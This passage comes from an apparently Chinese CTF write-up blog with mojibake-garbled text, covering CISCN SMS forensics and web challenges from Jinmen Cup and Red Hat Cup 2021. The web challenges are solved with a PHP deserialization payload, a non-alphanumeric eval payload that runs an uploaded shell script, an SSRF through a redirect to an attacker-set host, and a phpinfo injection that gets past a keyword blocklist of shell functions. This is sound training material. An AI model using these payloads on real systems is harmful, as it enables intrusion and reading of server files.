4d </span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">hello,bob!what is the flag?</span><br><span class="line">Length:27</span><br><span class="line"></span><br><span class="line">SMSC#</span><br><span class="line">Receipient:+10086</span><br><span class="line">Validity:Not Present</span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">the first part of the flag is the first 8 digits of your phone number</span><br><span class="line">Length:69</span><br><span class="line"></span><br><span class="line">SMSC#</span><br><span class="line">Receipient:+8615030442000</span><br><span class="line">Validity:Rel 5d </span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:08</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:UCS2(16)bit</span><br><span class="line"></span><br><span class="line">é‚£å…¶ä»–éƒ¨åˆ†å‘¢</span><br><span class="line">Length:6</span><br><span class="line"></span><br><span class="line">SMSC#</span><br><span class="line">Receipient:+8615030442000</span><br><span class="line">Validity:Rel 1h </span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:08</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:UCS2(16)bit</span><br><span class="line"></span><br><span class="line">çœ‹çœ‹ä½ èƒ½ä»è¿™äº›æ•°æ®é‡Œå‘ç°ä»€ä¹ˆï¼Ÿw465</span><br><span class="line">Length:16.5</span><br><span class="line"></span><br><span class="line">SMSC#+10086</span><br><span class="line">Sender:+8615030442000</span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:43:59 GMT ?</span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br><span class="line">Length:160</span><br><span class="line"></span><br><span class="line">SMSC#+10086</span><br><span class="line">Sender:+8615030442000</span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:44:43 GMT ?</span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf</span><br><span class="line">Length:160</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å°†å†…å®¹å¤„ç†æˆå¦‚ä¸‹æ ¼å¼ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TimeStamp:25&#x2F;04&#x2F;2021 19:43:59 GMT ?##5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹è„šæœ¬æŒ‰æ—¶é—´é¡ºåºæå–å‡ºå†…å®¹ï¼Œå†åå…­è¿›åˆ¶è§£ç å¯å¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">dataSet = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> datum <span class="keyword">in</span> data:</span><br><span class="line">    timeStamp, datum = datum.split(<span class="string">&quot;?##&quot;</span>)</span><br><span class="line">    timeStamp = timeStamp[<span class="number">10</span>:<span class="number">29</span>]</span><br><span class="line">    timeStamp = time.mktime(time.strptime(timeStamp, <span class="string">&quot;%d/%m/%Y %H:%M:%S&quot;</span>))</span><br><span class="line">    <span class="built_in">set</span> = &#123;timeStamp: datum&#125;</span><br><span class="line">    dataSet.update(<span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(dataSet):</span><br><span class="line">    <span class="built_in">print</span>(dataSet[i], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ ¹æ®æš—ç¤ºå°†å›¾ç‰‡çš„å®½åº¦ä¿®æ”¹ä¸º 465 å¯ä»¥å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621264945828/3dc96be32ae123ae82a44be2b9c91e8bd4192053.png"></p><p>æ ¹æ® SMS æç¤ºå¯çŸ¥ flag å‰å…«ä½ <code>15030442</code>ã€‚å°†å…¶æ‹¼åˆèµ·æ¥å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;15030442_b586_4c9e_b436_26def12293e4&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´¥é—¨æ¯ 2021</title>
      <link href="/zh-CN/posts/d2e5a5ad.html"/>
      <url>/zh-CN/posts/d2e5a5ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h3><p><code>.index.php.swp</code> æºç æ³„éœ²å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// initialise variables</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg=<span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg=<span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile =  <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;br/&gt;æ˜¨å¤©æ™šä¸Šå› ä¸º<span class="number">14</span>çº§å¤§é£åœç”µäº†.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¯çŸ¥ flag ä½äºæ ¹ç›®å½•ä¸‹ï¼ŒåŒæ—¶ weblog å¯¹è±¡ä¼šå®ä¾‹åŒ–ä¸€ä¸ª logger å¯¹è±¡ï¼Œä»è€Œè§¦å‘åˆ° <code>readfile($this-&gt;logFile)</code> å¤„ï¼Œè€Œ <code>logFile</code> æ˜¯å¯æ§å±æ€§ï¼Œå› æ­¤å¯ä»¥ååºåˆ—åŒ–è§¦å‘è¯»å–æ–‡ä»¶ã€‚ååºåˆ—åŒ–å‰é‡‡ç”¨äº† <code>preg_replace()</code> æ–¹æ³•æ¥è¿‡æ»¤è¾“å…¥ï¼Œåªéœ€è¦åœ¨åºåˆ—åŒ–åçš„è½½è·ä¸­åŒå†™ç»•è¿‡å³å¯ã€‚æ„é€ å‡ºå¦‚ä¸‹è„šæœ¬ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;weblogfile = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> weblog());</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¹¶åŒå†™ç»•è¿‡è¿‡æ»¤åå¾—åˆ°å¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;&#x2F;fflaglag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å°†è½½è·ä¸ºå‚æ•° log çš„å€¼å‘é€å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;EfuteB3QOqvRqD099mHuDRJKWRxnAC47&#125;</span><br></pre></td></tr></table></figure><h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h3><p>é¢˜ç›®ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å“åº”ä¸­å¯ä»¥æ‰¾åˆ° <code>X-Powered-By: PHP/5.6.40</code>ã€‚å› æ­¤å¸¸è§çš„å–åå’Œäº¦æˆ–éƒ½åœ¨ PHP 5.x ä¸‹å¤±å»ä½œç”¨ã€‚å› æ­¤å°è¯•æ‰§è¡Œ PHP ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€‚</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><p>ä½¿ç”¨å‚è€ƒæ–‡ç« ä¸­çš„æ–¹æ³•æ„é€ å‡ºå¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[?-[]&#96;;?&gt;</span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨ POST ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­å†™ä¸Šéœ€è¦æ‰§è¡Œçš„æ¶æ„ shell æŒ‡ä»¤ï¼Œä»¥æ–‡ä»¶çš„å½¢å¼ä¸Šä¼ ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">cat /f*</span><br></pre></td></tr></table></figure><p>è½½è·å‘é€åå³å¯åœ¨å“åº”ä¸­å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h76ghpt2v2JiYEKzBQ5ysxu9b2Z3mN4A&#125;</span><br></pre></td></tr></table></figure><h3 id="GoOSS"><a href="#GoOSS" class="headerlink" title="GoOSS"></a>GoOSS</h3><p>é¶æœºç»™å‡ºçš„è®¿é—®å¯¹çš„æ˜¯ Go çš„æœåŠ¡ï¼Œå› æ­¤æœ‰ä¸¤ä¸ªæ¥å£ã€‚åœ¨ <code>/vul</code> ä¸‹å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹åŠŸèƒ½ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url,<span class="string">&quot;http://127.0.0.1:1234/&quot;</span>)&#123;</span><br><span class="line">    c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Get(url.Url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æä¾›çš„æ˜¯ä¸€ä¸ªè®¿é—®æœ¬åœ°æœåŠ¡å¹¶è¿”å›ç»“æœçš„åŠŸèƒ½ï¼Œè€Œæ ¹æ®é™„ä»¶å¯çŸ¥é¶æœºçš„ 80 ç«¯å£è¿è¡Œç€ Apache å¹¶å¯ä»¥ç”¨å¦‚ä¸‹ PHP ä»£ç è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line">readfile(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯• bypass è¿™ä¸ªæ£€æµ‹å» SSRF å‘ç°ä¸å¤ªå¯èƒ½ã€‚æ‰¾åˆ°äº†å¦‚ä¸‹çš„ä»£ç ç‰‡æ®µï¼Œä»è€Œå°è¯•ä½¿ç”¨ 302 è·³è½¬æ¥å®ç°ä¸€ä¸ª SSRFã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">    c.Redirect(<span class="number">302</span>,c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    files := <span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">    l,_ := f.Readdir(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> _,i := <span class="keyword">range</span> l&#123;</span><br><span class="line">        files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">        <span class="string">&quot;files&quot;</span> :files,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>open redirect in static handler</p><p><a href="https://github.com/go-macaron/macaron/issues/198">https://github.com/go-macaron/macaron/issues/198</a></p></blockquote><p>æŒ‰ç…§å‚è€ƒä¸­çš„åˆ©ç”¨æ„é€ å‡º <code>&#123;&quot;url&quot;: &quot;http://127.0.0.1:1234//YOUR_HOST_IP/..&quot;&#125;</code>  å³å¯ 302 å»è®¿é—®ä»»æ„çš„åœ°å€ã€‚åªéœ€è¦åœ¨æœåŠ¡å™¨ç«¯æ”¾ä¸Šå¦‚ä¸‹ä»£ç å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;30e308e8e7122579b8ea2fae774d1999&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢å¸½æ¯ 2021</title>
      <link href="/zh-CN/posts/938f6c40.html"/>
      <url>/zh-CN/posts/938f6c40.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p><code>robots.txt</code> ä¸‹å¯ä»¥è¯»åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want:1ndexx.php</span><br></pre></td></tr></table></figure><p><code>/.1ndexx.php.swp</code> ä¸‹å¯ä»¥è¯»åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: 50px;</span><br><span class="line">font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#logo &#123;</span><br><span class="line">margin-bottom: 40px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id&#x3D;&quot;logo&quot; src&#x3D;&quot;logo.png&quot; &#x2F;&gt;</span><br><span class="line">&lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php if($link) &#123; ?&gt;</span><br><span class="line">&lt;h2&gt;I Can&#39;t view my php files?!&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;?php &#125; else &#123; ?&gt;</span><br><span class="line">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#Really easy...</span><br><span class="line"></span><br><span class="line">$file&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span><br><span class="line"></span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh &#x3D; fread($file,filesize(&quot;flag.php&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hack&#x3D;fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span><br><span class="line"></span><br><span class="line">$a&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\&#96;|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump&#x2F;&#39;,$a))&#123;</span><br><span class="line">die(&quot;you die&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($a)&gt;33)&#123;</span><br><span class="line">die(&quot;nonono.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line"></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å°è¯•åœ¨ hack.php ä¸­å†™å…¥ phpinfoï¼Œä½¿ç”¨å¦‚ä¸‹è½½è·å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();%<span class="number">20</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—® hack.php å¯åœ¨ phpinfo 